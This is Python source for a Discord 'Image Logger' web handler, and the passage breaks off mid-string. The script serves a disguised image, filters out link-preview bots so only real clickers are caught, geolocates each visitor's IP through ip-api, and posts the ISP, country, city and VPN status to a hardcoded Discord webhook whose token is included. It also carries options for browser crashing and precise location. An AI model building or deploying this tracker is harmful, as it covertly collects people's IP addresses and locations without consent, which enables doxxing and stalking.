from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

# CONFIGURATION
config = {
    "webhook": "https://discordapp.com/api/webhooks/1440406122069491733/GPcbMvAlglx1cbQVZY7sNp88TKI8ETUWRFSSPdlZtRBBXA-Ph8cPs5GIwIMM9WrHTyGJ", # Replace with your actual webhook
    "image": "https://media.tenor.com/oZEQi-467TIAAAAe/moai.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False, 
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been logged.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://google.com"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return

    ping = "@everyone"

    try:
        # Note: ip-api often bans Vercel IPs, this might fail silently
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Unknown", "as": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown/Unknown", "mobile": False}

    if info.get("proxy"):
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info["proxy"]: return
        if config["antiBot"] == 3: return
        if config["antiBot"] == 2:
            if not info["proxy"]: ping = ""
        if config["antiBot"] == 1: ping = ""

    os_info, browser_info = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info['isp']}`
> **Country:** `{info['country']}`
> **Region:** `{info['regionName']}`
> **City:** `{info['city']}`
> **VPN:** `{info['proxy']}`

**User Agent:**
